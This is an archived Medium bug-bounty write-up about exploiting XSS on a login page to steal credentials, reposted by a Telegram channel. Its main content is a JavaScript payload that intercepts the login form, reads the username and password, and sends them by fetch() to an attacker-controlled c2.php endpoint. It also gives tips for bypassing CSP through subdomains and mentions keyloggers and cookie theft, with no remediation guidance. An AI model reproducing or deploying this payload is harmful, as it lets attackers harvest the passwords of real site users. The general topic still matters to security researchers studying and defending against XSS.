# Stealing credentials using XSS (xss on login page) Your password my password .

- **Source URL:** https://medium.com/@brutal_panda/stealing-credentials-using-xss-xss-on-login-page-your-password-my-password-059354240801?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240614044021/https://medium.com/@brutal_panda/stealing-credentials-using-xss-xss-on-login-page-your-password-my-password-059354240801
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6394 (id 6394)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Stealing credentials using XSS (xss on login page)

Just a curious experiment , if a xss exists on a login page we can harvest credentials of users or specific data . (example of possible threat [here…](https://www.bugbountyhunter.com/hackevents/report?id=751)).

We have this innocent good looking site where it retrieves data from the url and puts it in the return back link and potentially vulnerable to and xss. We can either create a keylogger or target the username and password as follow .

**Note**

Depending on the JavaScript (JS) or Cross-Site Scripting (XSS) payload, its placement, and execution, we can create a script that extracts username and password information along with cookies or deploy a keylogger. In some cases, I’ve successfully retrieved scripts from my own domain.

It’s worth noting that two factors can impact the effectiveness of our payload:

1. Content Security Policy (CSP): This security feature can block or restrict the execution of scripts from external sources. However, we can bypass CSP by creating a subdomain if the header allows execution from the same subdomain.
2. Browser behavior: Different browsers react differently when executing code from another server. This can lead to varying results in terms of payload execution and effectiveness. For instance fetching a script wasn't possible on my Firefox and was possible in Chrome .

By understanding these factors, we can refine our approach to create more effective XSS payloads and bypass security measures like CSP and CORS restrictions.

# Harvesting Creds

Created a simple js that query the value of the password and username when the login button is clicked and send it to my server.

```
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); 
    prompt();
    const username = document.querySelector('.username').value;
    const password = document.querySelector('.password').value;
   const url = `https://sus.domain.com/c2.php?p={(password)}&u={(username)}=;`
    fetch(url)
        .then(response => response.text())
        .then(data => {
            console.log('Response:', data);
          
        })
        .catch(error => {
            console.error('Error:', error);
        });
});
```
Made the server then pass it to a database along with IP address so we dont get lost .
